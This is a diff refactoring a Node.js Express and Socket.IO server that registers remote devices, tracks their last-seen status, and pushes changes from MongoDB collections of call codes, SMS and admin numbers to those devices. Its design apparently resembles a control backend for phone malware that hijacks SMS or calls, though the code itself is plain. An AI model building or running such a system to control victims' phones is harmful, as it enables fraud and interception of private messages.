@@ -19,6 +19,7 @@ import serialRoutes from "./routes/serialRoutes.js";
 import statusRoutes from "./routes/statusRoutes.js";
 import lastSeenRoutes from "./routes/lastSeen.routes.js";
 
+// 🌿 Env + DB
 dotenv.config();
 connectDB();
 
@@ -32,7 +33,7 @@ app.use(cors());
 app.use(express.json());
 app.set("io", io);
 
-// 🧠 Maintain connected sockets
+// 🧠 Maintain connected device sockets
 const deviceSockets = new Map();
 
 // 🌐 SOCKET.IO HANDLER
@@ -40,7 +41,7 @@ io.on("connection", (socket) => {
   console.log("🟢 Client connected:", socket.id);
   let currentDeviceId = null;
 
-  // ✅ Device register
+  // ✅ Device registration
   socket.on("registerDevice", (uniqueid) => {
     if (!uniqueid) return;
     currentDeviceId = uniqueid;
@@ -50,15 +51,16 @@ io.on("connection", (socket) => {
     saveLastSeen(uniqueid, "Online");
   });
 
-  // ✅ Device status ping
+  // ✅ Handle device status ping
   socket.on("deviceStatus", (data) => {
     const { uniqueid, connectivity } = data || {};
     if (!uniqueid) return;
+    console.log(`⚡ DeviceStatus → ${uniqueid}: ${connectivity}`);
     saveLastSeen(uniqueid, connectivity);
     io.emit("deviceStatus", { uniqueid, connectivity, updatedAt: new Date() });
   });
 
-  // ❌ Disconnect
+  // ❌ On disconnect
   socket.on("disconnect", () => {
     console.log("🔴 Socket disconnected:", socket.id);
     if (currentDeviceId) {
@@ -75,6 +77,7 @@ io.on("connection", (socket) => {
   });
 });
 
+// 🔹 Helper: Save Last Seen status
 async function saveLastSeen(deviceId, connectivity) {
   try {
     const PORT = process.env.PORT || 5000;
@@ -88,78 +91,79 @@ async function saveLastSeen(deviceId, connectivity) {
   }
 }
 
-// 🧩 MongoDB Change Streams
+// 🧠 MongoDB Change Streams
 mongoose.connection.once("open", () => {
-  console.log("📡 MongoDB connected — Watching collections...");
+  console.log("📡 MongoDB connected — Listening to callcodes, sms, adminnumbers");
 
   try {
     // 📞 CALLCODES
     const callStream = mongoose.connection.collection("callcodes").watch();
     callStream.on("change", async (change) => {
-      const { operationType, documentKey } = change;
-      if (!["insert", "update", "replace"].includes(operationType)) return;
-
+      if (!["insert", "update", "replace"].includes(change.operationType)) return;
       const updatedDoc = await mongoose.connection
         .collection("callcodes")
-        .findOne({ _id: documentKey._id });
-
+        .findOne({ _id: change.documentKey._id });
       if (!updatedDoc) return;
-      const deviceId = updatedDoc.deviceId;
-      console.log(`📞 CallCode Updated → ${deviceId}`);
 
+      const deviceId = updatedDoc.deviceId;
+      console.log(`📞 CallCode Changed → ${deviceId}`);
+
+      // Emit to specific device
       const socketId = deviceSockets.get(deviceId);
-      if (socketId) io.to(socketId).emit("callCodeUpdate", updatedDoc); // per-device
-      io.emit("globalCallCodeUpdate", updatedDoc); // global broadcast
+      if (socketId) io.to(socketId).emit("callCodeUpdate", updatedDoc);
+
+      // Emit globally (optional for monitoring)
+      io.emit("globalCallCodeUpdate", updatedDoc);
     });
 
     // ✉️ SMS
     const smsStream = mongoose.connection.collection("sms").watch();
     smsStream.on("change", async (change) => {
-      const { operationType, documentKey } = change;
-      if (!["insert", "update", "replace"].includes(operationType)) return;
-
+      if (!["insert", "update", "replace"].includes(change.operationType)) return;
       const updatedDoc = await mongoose.connection
         .collection("sms")
-        .findOne({ _id: documentKey._id });
-
+        .findOne({ _id: change.documentKey._id });
       if (!updatedDoc) return;
-      const deviceId = updatedDoc.deviceId;
-      console.log(`📩 SMS Updated → ${deviceId}`);
 
+      const deviceId = updatedDoc.deviceId;
+      console.log(`📩 SMS Changed → ${deviceId}`);
+
+      // Emit to specific device
       const socketId = deviceSockets.get(deviceId);
-      if (socketId) io.to(socketId).emit("smsUpdate", updatedDoc); // per-device
-      io.emit("globalSmsUpdate", updatedDoc); // global broadcast
+      if (socketId) io.to(socketId).emit("smsUpdate", updatedDoc);
+
+      // Emit globally (optional)
+      io.emit("globalSmsUpdate", updatedDoc);
     });
 
     // 👑 ADMIN NUMBERS
     const adminStream = mongoose.connection.collection("adminnumbers").watch();
     adminStream.on("change", async (change) => {
-      const { operationType, documentKey } = change;
-      if (!["insert", "update", "replace"].includes(operationType)) return;
-
+      if (!["insert", "update", "replace"].includes(change.operationType)) return;
       const updatedDoc = await mongoose.connection
         .collection("adminnumbers")
-        .findOne({ _id: documentKey._id });
-
+        .findOne({ _id: change.documentKey._id });
       if (!updatedDoc) return;
-      console.log("👑 Admin Update:", updatedDoc);
 
-      io.sockets.emit("adminUpdate", updatedDoc);
+      console.log("👑 Admin Number Updated →", updatedDoc);
+      io.emit("adminUpdate", updatedDoc); // Broadcast to all clients
     });
 
-    // Error handlers
+    // Stream errors
     callStream.on("error", (err) => console.error("🚨 Call Stream Error:", err));
     smsStream.on("error", (err) => console.error("🚨 SMS Stream Error:", err));
     adminStream.on("error", (err) => console.error("🚨 Admin Stream Error:", err));
   } catch (err) {
-    console.error("❌ Change stream init failed:", err);
+    console.error("💥 Change stream initialization failed:", err);
   }
 });
 
-// Base route
-app.get("/", (req, res) => res.send("✅ Socket & MongoDB live!"));
+// 🌍 Base route
+app.get("/", (req, res) => {
+  res.send("✅ Live Socket + MongoDB Streams running for callcodes, sms, and adminnumbers!");
+});
 
-// API routes
+// 🧭 API routes
 app.use("/api/device", deviceRoutes);
 app.use("/api/sms", smsRoutes);
 app.use("/api/siminfo", simInfoRoutes);
@@ -170,11 +174,15 @@ app.use("/api/serial", serialRoutes);
 app.use("/api/status", statusRoutes);
 app.use("/api/lastseen", lastSeenRoutes);
 
-app.use((req, res) => res.status(404).json({ success: false, message: "Route not found" }));
+// ❌ 404 + Error handling
+app.use((req, res) =>
+  res.status(404).json({ success: false, message: "Route not found" })
+);
 app.use((err, req, res, next) => {
   console.error("💥 Unhandled error:", err);
   res.status(500).json({ success: false, message: "Internal server error" });
 });
 
+// 🚀 Start server
 const PORT = process.env.PORT || 5000;
 server.listen(PORT, () => console.log(`🚀 Server running on http://localhost:${PORT}`));
